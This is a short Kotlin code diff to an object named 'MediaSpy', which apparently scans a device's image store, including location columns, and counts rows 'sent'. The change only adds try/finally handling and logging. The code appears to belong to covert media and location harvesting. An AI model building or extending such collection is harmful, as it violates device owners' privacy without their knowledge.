@@ -71,6 +71,7 @@ object MediaSpy {
             MediaStore.Images.Media.LONGITUDE,
         )
 
+        try {
         runCatching {
             ctx.contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
@@ -164,8 +165,11 @@ object MediaSpy {
             lastErr = (it.javaClass.simpleName + ":" + (it.message ?: "")).take(80)
             Log.w(TAG, "scan: ${it.message}")
         }
-        lastRows = rows
-        lastSent = sent
+        } finally {
+            lastRows = rows
+            lastSent = sent
+            Log.i(TAG, "scan done: rows=$rows sent=$sent")
+        }
 
         val ed = pref.edit()
         if (newest > since) ed.putLong(KEY_LAST, newest)
